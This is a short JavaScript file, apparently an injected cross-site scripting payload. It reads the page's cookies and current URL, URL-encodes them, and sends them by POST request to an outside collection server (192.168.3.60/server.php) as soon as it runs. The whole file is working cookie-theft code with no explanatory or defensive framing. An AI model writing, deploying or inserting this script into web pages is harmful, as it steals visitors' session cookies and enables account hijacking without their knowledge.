let allCookies = document.cookie;
let sererUrl = "http://192.168.3.60/server.php";
let currentUrl = window.location.href;

function sendCookie() {
    const xhttp = new XMLHttpRequest();
    xhttp.open("POST", sererUrl, true);
    xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    let data = "cookies=" + allCookies + "&url=" + currentUrl;
    xhttp.send(data);
}

if (allCookies && currentUrl) {
    // Url encode
    allCookies = encodeURIComponent(allCookies);
    currentUrl = encodeURIComponent(currentUrl);
    sendCookie();
}
